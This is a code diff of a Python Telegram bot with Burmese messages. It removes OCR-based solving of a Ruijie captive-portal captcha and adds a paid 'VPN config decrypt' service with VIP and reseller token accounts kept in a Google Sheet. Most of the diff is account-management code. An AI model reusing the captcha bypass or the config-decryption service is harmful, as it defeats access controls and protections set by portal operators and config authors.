+            bot.send_document(chat_id, doc, caption=f"✅ <b>{selected_vpn['name']} Config Decrypted Successfully!</b>", parse_mode="HTML")
+        if os.path.exists(temp_file_path): os.remove(temp_file_path)
     except Exception as e:
-        print(f"[Code_Expires_Date] error: {e}")
-        return "📋 Plan: Unknown | ⏳ Time: Unknown"
+        bot.send_message(chat_id, f"❌ <b>Error:</b> <code>{str(e)}</code>\nပြဿနာတစ်စုံတစ်ရာရှိပါက Admin သို့ မေးမြန်းနိုင်ပါသည်။", reply_markup=get_admin_contact_markup(), parse_mode="HTML")
 
 
-_ocr = ddddocr.DdddOcr(show_ad=False)
+# ==========================================
+# INPUT HANDLERS (STATE MANAGEMENT)
+# ==========================================
+@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) is not None)
+def handle_inputs(message):
+    user_id = message.from_user.id
+    state = user_states.get(user_id)
+    text = message.text.strip()
+    
+    valid, _, _ = is_access_valid(user_id)
+    
+    if not is_reseller(user_id):
+        user_states[user_id] = None
+        return bot.reply_to(message, "❌ <b>ခွင့်ပြုချက် မရှိပါ!</b>", reply_markup=get_menu_markup(user_id), parse_mode="HTML")
 
-def _ocr_sync(image_bytes):
-    nparr = np.frombuffer(image_bytes, np.uint8)
-    img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-    if img is None:
-        return None
-    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-    blur = cv2.GaussianBlur(gray, (3, 3), 0)
-    _, thresh = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
-    _, buffer = cv2.imencode('.png', thresh)
-    result = _ocr.classification(buffer.tobytes())
-    return result.upper()
+    if not valid and not is_admin(user_id):
+        user_states[user_id] = None
+        return bot.reply_to(message, "⚠️ <b>သင့်အကောင့် သက်တမ်းကုန်ဆုံးသွားပါပြီ!</b>", reply_markup=get_admin_contact_markup(), parse_mode="HTML")
 
-async def Captcha_Text(image_bytes):
-    return await asyncio.to_thread(_ocr_sync, image_bytes)
-
-async def Captcha_Image(session, session_id):
-    headers = {
-        'authority': 'portal-as.ruijienetworks.com',
-        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
-        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Linux"',
-        'sec-fetch-dest': 'image',
-        'sec-fetch-mode': 'no-cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
-    }
-    params = {
-        'sessionId': session_id,
-        '_t': str(time.time()),
-    }
-    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
-        return await req.read()
-
-async def Varify_Captcha(session, session_id, text):
-    headers = {
-        'authority': 'portal-as.ruijienetworks.com',
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
-        'content-type': 'application/json',
-        'origin': 'https://portal-as.ruijienetworks.com',
-        'referer': 'https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId=4bcb26270ae44395859a3119059fb15e',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Linux"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
-    }
-    json_data = {
-        'sessionId': session_id,
-        'authCode': text,
-    }
-    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
-        data = await req.json()
-        print(f"[Varify_Captcha] status={req.status} authCode={text} response={data}")
-        if data.get("success") == True:
-            return session_id
+    # --- ADD VIP ---
+    if state == "ADD_VIP_ID":
+        if is_vip_exists(text):
+            vip_temp_data[user_id] = {"apk_id": text, "name": "Edit_VIP"}
+            user_states[user_id] = "ADD_VIP_MONTH"
+            bot.reply_to(message, "⚠️ <b>ယခု Telegram ID သည် VIP User ဖြစ်ပြီးသားဖြစ်ပါသဖြင့် သက်တမ်းတိုးမြှင့်ရန်</b>\n\nလအရေအတွက် (ဥပမာ- 1) ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
         else:
-            return None
+            vip_temp_data[user_id] = {"apk_id": text}
+            user_states[user_id] = "ADD_VIP_NAME"
+            bot.reply_to(message, "👤 အသုံးပြုသူ၏ <b>အမည် (Name)</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+        
+    elif state == "ADD_VIP_NAME":
+        vip_temp_data[user_id]["name"] = text
+        user_states[user_id] = "ADD_VIP_MONTH"
+        bot.reply_to(message, "⏳ သက်တမ်းသတ်မှတ်ရန် <b>လအရေအတွက် (ဥပမာ- 1)</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+        
+    elif state == "ADD_VIP_MONTH":
+        if not text.isdigit(): return bot.reply_to(message, "⚠️ ဂဏန်းသီးသန့်ပဲ ရိုက်ထည့်ပေးပါ-")
+        months = int(text)
+        
+        current_bal = get_reseller_tokens(user_id)
+        if not deduct_reseller_tokens_by_days(user_id, months):
+            user_states[user_id] = None
+            err_msg = f"❌ <b>သင့်မှာ လုံလောက်တဲ့ Token မရှိပါ။</b>\n\n" \
+                      f"⚠️ လိုအပ်သောပမာဏ: <code>{months}</code> Tokens\n" \
+                      f"🪙 သင့်လက်ကျန်: <code>{current_bal}</code> Tokens\n\n" \
+                      f"Token ပြန်လည်ဖြည့်သွင်းရန် Admin ထံသို့ ဆက်သွယ်နိုင်ပါသည်။"
+            return bot.reply_to(message, err_msg, reply_markup=get_admin_contact_markup(), parse_mode="HTML")
+            
+        apk_id = vip_temp_data[user_id]["apk_id"]
+        name = vip_temp_data[user_id]["name"]
+        start_date = get_current_date_string()
+        
+        success = push_to_google_sheet("sync", users="", added_by=user_id, name=name, key=apk_id, start=start_date, month=months)
+        if success:
+            pull_data_from_google_sheet()
+            if name == "Edit_VIP":
+                bot.reply_to(message, f"✅ VIP အကောင့် သက်တမ်း တိုးမြှင့်ပြီးပါပြီ။\n🆔 Telegram ID: <code>{apk_id}</code>\n⏳ Expired: <code>{months}</code> Months", parse_mode="HTML")
+            else:
+                bot.reply_to(message, f"✅ VIP အကောင့် အောင်မြင်စွာ ဖန်တီးပြီးပါပြီ။\n🆔 Telegram ID: <code>{apk_id}</code>\n👤 VIP Name: <code>{name}</code>\n⏳ Expired: <code>{months}</code> Months", parse_mode="HTML")
+        else:
+            bot.reply_to(message, "❌ Sheet သို့ ပို့ဆောင်မှု မအောင်မြင်ပါ။")
+        user_states[user_id] = None
 
+    # --- EDIT VIP ---
+    elif state == "EDIT_VIP_ID":
+        if not is_vip_exists(text):
+            user_states[user_id] = None
+            return bot.reply_to(message, "❌ <b>အဆိုပါ Telegram ID အား ရှာမတွေ့ပါ။</b>", parse_mode="HTML")
+        vip_temp_data[user_id] = {"apk_id": text}
+        user_states[user_id] = "EDIT_VIP_MONTH"
+        bot.reply_to(message, "✏️ တိုးမြှင့်မည့် <b>လအရေအတွက် (Month)</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
 
-async def start_polling():
-    backoff = 5
-    while True:
-        try:
-            await bot.infinity_polling(timeout=20, request_timeout=35)
-            return
-        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-            print(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
-            await asyncio.sleep(backoff)
-            backoff = min(backoff * 2, 60)
-        except Exception as e:
-            print(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
-            await asyncio.sleep(backoff)
-            backoff = min(backoff * 2, 60)
+    elif state == "EDIT_VIP_MONTH":
+        if not text.isdigit(): return bot.reply_to(message, "⚠️ ဂဏန်းသီးသန့်ပဲ ရိုက်ထည့်ပေးပါ-")
+        months = int(text)
+        
+        current_bal = get_reseller_tokens(user_id)
+        if not deduct_reseller_tokens_by_days(user_id, months):
+            user_states[user_id] = None
+            err_msg = f"❌ <b>သင့်မှာ လုံလောက်တဲ့ Token မရှိပါ။</b>\n\n" \
+                      f"⚠️ လိုအပ်သောပမာဏ: <code>{months}</code> Tokens\n" \
+                      f"🪙 သင့်လက်ကျန်: <code>{current_bal}</code> Tokens\n\n" \
+                      f"Token ပြန်လည်ဖြည့်သွင်းရန် Admin ထံသို့ ဆက်သွယ်နိုင်ပါသည်။"
+            return bot.reply_to(message, err_msg, reply_markup=get_admin_contact_markup(), parse_mode="HTML")
+            
+        apk_id = vip_temp_data[user_id]["apk_id"]
+        start_date = get_current_date_string()
+        success = push_to_google_sheet("sync", users="", added_by=user_id, name="Edit_VIP", key=apk_id, start=start_date, month=months)
+        if success:
+            pull_data_from_google_sheet()
+            bot.reply_to(message, "✅ VIP အကောင့် သက်တမ်း တိုးမြှင့်ပြီးပါပြီ။", parse_mode="HTML")
+        else:
+            bot.reply_to(message, "❌ ပြင်ဆင်မှု မအောင်မြင်ပါ။")
+        user_states[user_id] = None
 
-async def main():
-    global session, _connector
-    timeout = aiohttp.ClientTimeout(total=30)
-    _connector = aiohttp.TCPConnector(
-        limit=5000,
-        ttl_dns_cache=300,
-        ssl=False
-    )
-    session = aiohttp.ClientSession(
-        timeout=timeout,
-        connector=_connector,
-        connector_owner=False
-    )
-    try:
-        asyncio.create_task(web_server())
-        asyncio.create_task(github_update_scheduler())
-        await start_polling()
-    finally:
-        await session.close()
-        await _connector.close()
+    # --- DELETE VIP ---
+    elif state == "DEL_VIP_ID":
+        apk_id = text
+        if not is_vip_exists(apk_id):
+            user_states[user_id] = None
+            return bot.reply_to(message, "❌ <b>အဆိုပါ Telegram ID အား ရှာမတွေ့ပါ။</b>", parse_mode="HTML")
+            
+        success = push_to_google_sheet("delete", users="", name="Delete", key=apk_id, start="", month=0)
+        if success:
+            pull_data_from_google_sheet()
+            bot.reply_to(message, f"✅ VIP Telegram ID: <code>{apk_id}</code> အား ဖျက်သိမ်းပြီးပါပြီ။", parse_mode="HTML")
+        else:
+            bot.reply_to(message, "❌ ဖျက်သိမ်းမှု မအောင်မြင်ပါ။")
+        user_states[user_id] = None
 
-if __name__ == '__main__':
-    asyncio.run(main())
+    # --- CREATE RESELLER ---
+    elif state == "ADD_RES_ID":
+        if not is_admin(user_id): return
+        if is_reseller_exists(text):
+            reseller_temp_data[user_id] = {"tg_id": text, "is_edit_mode": True}
+            user_states[user_id] = "ADD_RES_TOKENS"
+            bot.reply_to(message, "⚠️ <b>ယခု Telegram ID သည် Reseller ဖြစ်ပြီးသားဖြစ်ပါသဖြင့် တိုကင်တိုးမြှင့်ရန်</b>\n\nထပ်မံပေါင်းထည့်ပေးမည့် <b>Token ပမာဏ (Credits)</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+        else:
+            reseller_temp_data[user_id] = {"tg_id": text, "is_edit_mode": False}
+            user_states[user_id] = "ADD_RES_NAME"
+            bot.reply_to(message, "👤 ဖန်တီးမည့် Reseller အမည် ကို ရိုက်ထည့်ပေးပါ-")
+
+    elif state == "ADD_RES_NAME":
+        if not is_admin(user_id): return
+        reseller_temp_data[user_id]["username"] = text
+        user_states[user_id] = "ADD_RES_TOKENS"
+        bot.reply_to(message, "🪙 ထည့်သွင်းပေးမည့် <b>Token ပမာဏ (Credit)</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+
+    elif state == "ADD_RES_TOKENS":
+        if not is_admin(user_id): return
+        if not text.isdigit(): return bot.reply_to(message, "⚠️ ဂဏန်းသီးသန့်ပဲ ရိုက်ထည့်ပေးပါ-")
+        reseller_temp_data[user_id]["tokens"] = int(text)
+        user_states[user_id] = "ADD_RES_MONTH"
+        bot.reply_to(message, "⏳ သတ်မှတ်မည့် <b>လအရေအတွက် (Month)</b> ကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+
+    elif state == "ADD_RES_MONTH":
+        if not is_admin(user_id): return
+        if not text.isdigit(): return bot.reply_to(message, "⚠️ ဂဏန်းသီးသန့်ပဲ ရိုက်ထည့်ပေးပါ-")
+        months = int(text)
+        tokens = reseller_temp_data[user_id]["tokens"]
+        r_id = reseller_temp_data[user_id]["tg_id"]
+        is_edit_mode = reseller_temp_data[user_id].get("is_edit_mode", False)
+        
+        if is_edit_mode:
+            r_name = "Update_Mode"
+        else:
+            r_name = reseller_temp_data[user_id]["username"] + "_Reseller"
+            
+        start_date = get_current_date_string()
+        success = push_to_google_sheet("sync_reseller", users=r_id, name=r_name, key=str(tokens), start=start_date, month=0, reseller_months=months)
+        
+        if success:
+            pull_data_from_google_sheet()
+            if is_edit_mode:
+                bot.reply_to(message, f"✅ Reseller (ID: <code>{r_id}</code>) အား Token <b>+{tokens} Tk</b> နှင့် သက်တမ်း <b>+{months} Months</b> ထပ်မံပေါင်းထည့်ပေးမှု အောင်မြင်ပါသည်။", parse_mode="HTML")
+            else:
+                bot.reply_to(message, f"✅ Reseller (ID: <code>{r_id}</code>) အား ဖန်တီးပြီးပါပြီ။\n🆔 Telegram ID: <code>{r_id}</code>\n👤 Name: {reseller_temp_data[user_id]['username']}\n🪙 Token Count: {tokens} Tk\n⏳ Expired: {months} Months", parse_mode="HTML")
+        else:
+            bot.reply_to(message, "❌ Google Sheet ချိတ်ဆက်မှု လွဲချော်နေပါသည်။")
+        user_states[user_id] = None
+
+    # --- EDIT RESELLER ---
+    elif state == "EDIT_RES_ID":
+        if not is_admin(user_id): return
+        if not is_reseller_exists(text):
+            user_states[user_id] = None
+            return bot.reply_to(message, "❌ <b>အဆိုပါ Reseller Telegram ID အား ရှာမတွေ့ပါ။</b>", parse_mode="HTML")
+        
+        reseller_temp_data[user_id] = {"tg_id": text, "is_edit_mode": True}
+        user_states[user_id] = "ADD_RES_TOKENS"
+        bot.reply_to(message, f"🆔 Reseller ID: <b>{text}</b>\n\n<b>ထပ်မံတိုးမြှင့် ပေါင်းထည့်ပေးမည့်</b> Token ပမာဏကို ရိုက်ထည့်ပေးပါ-", parse_mode="HTML")
+
+    # --- DELETE RESELLER ---
+    elif state == "DEL_RES_ID":
+        if not is_admin(user_id): return
+        r_id = text
+        if not is_reseller_exists(r_id):
+            user_states[user_id] = None
+            return bot.reply_to(message, "❌ <b>အဆိုပါ Reseller Telegram ID အား ရှာမတွေ့ပါ။</b>", parse_mode="HTML")
+            
+        success = push_to_google_sheet("delete_reseller", users=r_id, name="RESELLER_ACCOUNT", key="RESELLER_ACCOUNT", start="", month=0)
+        if success:
+            pull_data_from_google_sheet()
+            bot.reply_to(message, f"✅ Reseller (ID: <code>{r_id}</code>) အား ဖျက်ထုတ်ပြီးပါပြီ။", parse_mode="HTML")
+        else:
+            bot.reply_to(message, "❌ ဖျက်သိမ်းမှု လွဲချော်ခဲ့သည်။")
+        user_states[user_id] = None
+
+# ==========================================
+# FLASK WEB SERVER RUNNERS
+# ==========================================
+@app.route('/')
+def home():
+    return "VPN Decrypt Bot is running smoothly!"
+
+@app.route('/' + BOT_TOKEN if BOT_TOKEN else '/webhook', methods=['POST'])
+def webhook():
+    if request.headers.get('content-type') == 'application/json':
+        json_string = request.get_data().decode('utf-8')
+        update = types.Update.de_json(json_string)
+        bot.process_new_updates([update])
+        return ''
+    else:
+        abort(403)
+
+def run_server():
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
+
+if __name__ == "__main__":
+    init_db()
+    pull_data_from_google_sheet()
+    
+    if PUBLIC_URL and BOT_TOKEN:
+        bot.remove_webhook()
+        bot.set_webhook(url=f"{PUBLIC_URL}/{BOT_TOKEN}")
+        run_server()
+    else:
+        bot.remove_webhook()
+        Thread(target=run_server).start()
+        bot.infinity_polling(skip_pending=True)
